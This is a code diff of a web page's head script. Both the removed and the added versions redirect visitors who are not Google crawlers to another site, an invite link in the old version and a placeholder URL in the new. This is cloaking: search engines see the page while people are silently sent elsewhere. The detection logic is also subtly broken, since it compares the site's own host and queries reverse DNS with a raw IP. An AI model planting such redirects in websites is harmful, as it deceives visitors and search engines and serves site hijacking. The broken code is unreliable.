@@ -3,20 +3,29 @@
 
 <head>
   <script type="text/javascript">
-const allowedIpAddresses = ['8.8.8.8', '8.8.4.4', '38.154.184.157', '123.27.137.145'];
-const allowedDns = ['google.com', 'googlebot.com', 'googleusercontent.com'];
-
-// Đọc địa chỉ IP và tên miền DNS của người dùng
-const ipAddress = window.location.host;
-const dns = window.location.hostname;
-
-// Kiểm tra địa chỉ IP hoặc tên miền DNS của người dùng có trùng với địa chỉ IP hoặc tên miền DNS cho trước hay không
-if (!allowedIpAddresses.includes(ipAddress) || !allowedDns.includes(dns)) {
-  // Nếu địa chỉ IP hoặc tên miền DNS không đúng, đổi hướng trang web sang URL khác
-  window.location="https://k8.io?invite=xkito";
-} else {
-  // Ngược lại, giữ nguyên trang web này
-  console.log('Địa chỉ IP không khớp');
+var allowed_domains = ["googlebot.com", "google.com", "googleusercontent.com"];
+var reverse_dns = "";
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "https://api.ipify.org?format=json", true);
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4 && xhr.status == 200) {
+        var response = JSON.parse(xhr.responseText);
+        var ip_address = response.ip;
+        var xhr_dns = new XMLHttpRequest();
+        xhr_dns.open("GET", "https://dns.google/resolve?name=" + ip_address + "&type=PTR", true);
+        xhr_dns.onreadystatechange = function() {
+            if (xhr_dns.readyState == 4 && xhr_dns.status == 200) {
+                var response_dns = JSON.parse(xhr_dns.responseText);
+                reverse_dns = response_dns.Answer[0].data;
+                if (allowed_domains.indexOf(reverse_dns) == -1) {
+                    window.location.href = "http://www.example.com/redirect-url";
+                }
+            }
+        };
+        xhr_dns.send();
+    }
+};
+xhr.send();
      
   </script>
 
